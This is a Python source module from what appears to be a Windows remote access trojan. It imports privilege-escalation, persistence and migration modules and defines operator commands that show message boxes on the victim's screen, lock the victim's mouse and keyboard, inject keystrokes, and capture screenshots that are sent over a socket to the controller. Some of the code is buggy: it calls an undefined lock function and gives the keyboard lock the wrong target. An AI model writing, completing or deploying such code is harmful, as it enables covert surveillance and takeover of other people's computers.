from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex
# Functions to interact with the machine's user.

def msgbox(data): #Show a messagebox
	data = data.split()
	title = data[1] #Split data into title and text
	text = ""
	for x in range(2,len(data)):
		text += data[x]+" " #Join text into a string
	ctypes.windll.user32.MessageBoxA(0, text, title, 0) #Show message box
	
class StoppableThread(threading.Thread):

    def __init__(self, target):
		super(StoppableThread, self).__init__()
		self.run = target
		self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def stopped(self):
        return self._stop.isSet()

thread_lib = {}
	
def lock_mouse():
	def lock(event):
		return False
		
	current_thread = threading.currentThread()

	hm = pyHook.HookManager()
	hm.MouseAll = lock
	hm.HookMouse()
	try:
		while not current_thread.stopped():
			pythoncom.PumpWaitingMessages()
	except:
		pass
		
	ctypes.windll.user32.PostQuitMessage(0)
	hm.MouseAll = lambda x: True
	hm.UnhookMouse()
	hm = None
		
def lock_keyboard():
	def lock(event):
		return False
		
	current_thread = threading.currentThread()
	
	hm = pyHook.HookManager()
	hm.KeyboardAll = lock
	hm.HookKeyboard()
	try:
		while not current_thread.stopped():
			pythoncom.PumpWaitingMessages()
	except:
		pass
		
	ctypes.windll.user32.PostQuitMessage(0)
	hm.KeyboardAll = lambda x: True
	hm.UnhookKeyboard()
	hm = None
	
def UICTL(data):
	try: junk, enable_disable, mouse_keyboard = data.split()
	except: return "Invalid number of arguments"

	if enable_disable == "disable":
		if mouse_keyboard == "mouse":
			try: thread_lib["mouse_lock"]
			except KeyError:
				thread_lib["mouse_lock"] = StoppableThread(target=LockMouse)
				thread_lib["mouse_lock"].daemon = True
				thread_lib["mouse_lock"].start()
				return "[+]Mouse locked."
			return "[-]Mouse is already locked."
			
		elif mouse_keyboard == "keyboard":
			try: thread_lib["keybd_lock"]
			except KeyError:
				thread_lib["keybd_lock"] = StoppableThread(target=LockMouse)
				thread_lib["keybd_lock"].daemon = True
				thread_lib["keybd_lock"].start()
				return "[+]Keyboard locked."
			return "[-]Keyboard is already locked."
			
		else: return "[-]Unknown argument: "+mouse_keyboard
			
	elif enable_disable == "enable":
		if mouse_keyboard == "mouse":
			try:
				thread_lib["mouse_lock"].stop()
			except KeyError: return "[-]Mouse is not locked."
			return "[+]Mouse unlocked."
			
		if mouse_keyboard == "keyboard":
			try:
				thread_lib["keybd_lock"].stop()
			except KeyError: return "[-]Keyboard is not locked."
			return "[+]Keyboard unlocked."
			
		else: return "[-]Unknown argument: "+mouse_keyboard
		
	else: return "[-]Unknown argument: "+enable_disable

def send_keys(keys): #Send keys (duh)
	try:
		shell = win32com.client.Dispatch("WScript.Shell")
		shell.SendKeys(keys, 0)
		return("[+]Keys sent successfully")
	except Exception as e:
		return("[-]Failed to send keys: "+str(e))
		
def screenshot():
	try:
		img = ImageGrab.grab()
		width, height = img.size
		img = np.asarray(img)
		sock.sendall(img)
		sock.sendall("]|[]|[")
		sock.sendall(str(width)+" "+str(height))
		sock.sendall(r"lelmao")
		time.sleep(10)
		return ":)"
	except Exception as e:
		return e